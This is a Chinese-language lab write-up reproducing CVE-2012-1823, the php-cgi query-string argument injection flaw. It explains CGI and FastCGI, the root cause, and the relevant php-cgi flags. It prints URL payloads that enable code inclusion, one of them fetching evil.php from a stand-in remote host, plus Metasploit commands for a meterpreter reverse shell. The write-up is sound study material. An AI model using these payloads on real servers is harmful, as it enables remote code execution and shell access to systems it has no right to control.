# [vulhub]：CVE-2012-1823 php-cgi远程代码执行

时间：2020-2-6

Author：badbird

---

***该漏洞只出现在以cgi模式运行的php中。影响范围  < 5.3.12  < 5.4.2***

<center><h3>0x01 预备知识</h3></center>

​		**什么是CGI？**

​		Common Gateway Interface 即“通用网关接口”。用于处理浏览器（客户端）向服务器发送的数据，在服务器上部署。CGI实际上是一种数据处理的协议，相当于Web服务器“背后的女人”。

​		**CGI做了什么工作？**

​		[大佬理解](https://zhuanlan.zhihu.com/p/25013398)

​		浏览器用户提交的表单数据发送到服务器后，CGI从环境变量和标准输入获取数据进行处理（比如写入数据库），然后再向标准输出发送数据，由于Web服务已经做了重定向，将标准输出重定向给Web服务器与浏览器连接的socket，所以在浏览器就可以看到用户刚刚提交的数据的处理结果了。

​		浏览器用户提交数据(POST)-->服务器上的CGI程序从标准输入获取数据-->CGI程序处理数据-->返回响应到Web服务器-->Web服务器向客户端发送html响应

​		浏览器用户提交数据(GET)-->服务器上的CGI程序从环境变量获取数据-->CGI程序处理数据-->返回响应到Web服务器-->Web服务器向客户端发送html响应

​		基本框架已经明了了，*Web服务器与客户端浏览器进行http通信传输数据，CGI程序作为Web服务器的被调用程序用于数据的处理。*而CGI的作用就是*从环境变量和标准输入中读取数据、进行处理，然后向标准输出输出数据*

​		**什么是FastCGI**

​		由于CGI的工作流程是一个进程处理一个请求，处理完毕就退出，这样如果服务器网站访问量很大，过多的进程会消耗系统资源，且每次启动进程都需要初始化一下（读取配置），很慢，使服务显得性能低下。FastCGI应运而生。它被激活后会一直执行着，一个***FastCGI进程管理器***启动多个CGI解释器进程，等待处理多个请求。处理结束后子进程不退出

<center><h3>0x02 PHP的运行模式</h3></center>

​		**PHP-CGI**：是PHP自带的FastCGI管理器

​		**PHP中的SAPI（Server API）**：是应用层服务器程序比如apache等和PHP交互数据的入口，相当于PHP的消息“传递者”

​		php-cgi就是一个sapi，它提供了两种运行方式：cgi和fastcgi

<center><h3>0x03 漏洞成因</h3></center>

​		用户请求的查询字符串（query string）会被作为php-cgi的参数，导致一系列结果。

​		[RFC3875](https://www.ietf.org/rfc/rfc3875)中指出：

![image-20210206182203432](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210206182203432.png)

​		即如果querystring中不包含未解码的”=“时，应将querystring作为words（这里应该理解为具有执行意义的参数）也就是cgi的参数传入。Apache按要求实现了这个功能，但php显然没有做好。php对于传参的处理是在Web上下文不允许传入参数，仅仅是普通的命令行的那种传参方式比如：

​											 #!/usr/local/bin/php-cgi -d include_path=/path

但显然RFC中规定的querystring也有机会被当作参数传入cgi。

<center><h3>0x03 漏洞利用</h3></center>

​		已经得知querystring可以作为cgi的参数，那么利用这个漏洞首先要知道的就是cgi有哪些有用参数：

- -c 指定php.ini文件的位置

- -n 不要加载php.ini文件

- -d 指定配置项

- -b 启动fastcgi进程

- -s 显示文件源码

- -T 执行指定次该文件

- -h 和 -? 显示帮助

  ​	最简单直接的利用方式莫过于使用 -s 查看源码了：

![image-20210206185746964](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210206185746964.png)

这里有个误区，细心的人会发现数据包是有GET标识的，所以以为是采用了get方式构造querystring，其实不然，回过去看看RFC文档：

![image-20210206190837328](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210206190837328.png)

更重要的一点，参数**仅在URL中**才会被传递给cgi程序。

![image-20210206190713818](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210206190713818.png)

高级一点的利用方式：通过-d指定auto_prepend_file来制造任意文件包含漏洞。

需要注意的是，同时，我们应该将**allow_url_include设置为on**

而且，如果想指定执行自己的php文件，那么还会用到**php://input来以POST方式传递**php代码，或者也可以包含自己服务器的文件

更重要的是，记住前提条件，”*url中的querystring*“和”*未解码的=号*“

![image-20210206200713293](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210206200713293.png)

原始payload：%3d为”=“的URL编码; %3a为”:“的URL编码

```
?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
?-d+allow_url_include%3don+-d+auto_prepend_file%3dhttp%3a//www.example.com/evil.php
```

### 使用Metasploit反弹shell

（现在因为使用bp测试太多，阿里云服务器把我IP BAN掉了应该。。这个就不实操了）

```
search php_cgi
use exploit/multi/http/php_cgi_arg_injection
set rhosts 目标ip
set rport 8080
set payload php/meterpreter/reverse_tcp
set lhost 攻击ip
```

<center><h3>0x04 总结</h3></center>

​		2012年的漏洞，想当年还在初中，刚刚拥有第一台家用PC。

​		CGI现在基本都灭绝了，这个漏洞也仅仅当作一种”纪念“，来作为我的Web安全之路复现学习的第一个漏洞。

​		其实还是有很多东西值得体味的，越古老的东西越接近底层，通过学习了解这些古老的东西也能加深一些对Web服务通信流程的理解，而且，这种古老的东西和现在学校里教的知识很匹配:dog: 更容易产生知识联想，还是挺不错的体验。

​		从0到此整整一下午的时间，收获肯定是有的：懂了CGI；知道了RFC的重要性（从本漏洞看来，读RFC文档完全可以成为挖漏洞的一种思路）；知其然，一定要知其所以然效果才更好。



参考：

http://www.360doc.com/content/18/0327/17/51484742_740649523.shtml

https://zhuanlan.zhihu.com/p/25013398

https://www.ietf.org/rfc/rfc3875

https://jaminzhang.github.io/web/CGI-FastCGI-PHP-CGI-PHP-FPM-Concepts-Understanding/

https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html

https://www.freebuf.com/vuls/678.html